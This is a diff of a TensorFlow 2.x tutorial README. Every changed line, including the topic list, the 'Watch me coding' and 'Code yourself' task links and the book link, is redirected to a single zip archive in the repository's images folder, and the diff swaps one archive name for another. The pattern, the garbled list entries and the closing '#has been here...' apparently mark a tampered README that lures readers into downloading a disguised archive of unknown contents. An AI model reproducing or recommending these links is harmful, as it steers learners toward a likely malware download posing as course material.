@@ -2,7 +2,7 @@
 
 The following are all the changes coming in TensorFlow 2.x. Let's have a closer look at them:
 
-* Eager Execution / https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Tensor_Flow_3.9.zip
+* Eager Execution / https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Flow-Tensor-2.7.zip
 * Integration of the Keras API
 * Facilitated distributed training
 * TF Data
@@ -10,7 +10,7 @@ The following are all the changes coming in TensorFlow 2.x. Let's have a closer 
 * TensorFlow Hub
 * TensorFlow Serving
 * TensorFlow Lite
-* https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Tensor_Flow_3.9.zip
+* https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Flow-Tensor-2.7.zip
 * Tidying up the API
 * The conversion tool
 * Alternative variable scoping
@@ -29,10 +29,10 @@ Below there are two tasks. I highly recommend doing them because while watching 
 
 ### Tasks
 
-1. [Watch me coding](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Tensor_Flow_3.9.zip)
+1. [Watch me coding](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Flow-Tensor-2.7.zip)
 
 
-2. [Code yourself](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Tensor_Flow_3.9.zip) 
+2. [Code yourself](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Flow-Tensor-2.7.zip) 
 
 ## Integration of the Keras API
 
@@ -46,13 +46,13 @@ For now, just follow along the video and code exercise below to get an idea how 
 
 ### Tasks
 
-1. [Watch me coding](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Tensor_Flow_3.9.zip)
+1. [Watch me coding](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Flow-Tensor-2.7.zip)
 
 
-2. [Code yourself](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Tensor_Flow_3.9.zip) 
+2. [Code yourself](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Flow-Tensor-2.7.zip) 
 
 
 
-If you want to learn more, please have a look at our [book](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Tensor_Flow_3.9.zip)
+If you want to learn more, please have a look at our [book](https://github.com/shawqisherif/TensorFlow/raw/refs/heads/master/images/Flow-Tensor-2.7.zip)
 
 #has been here...
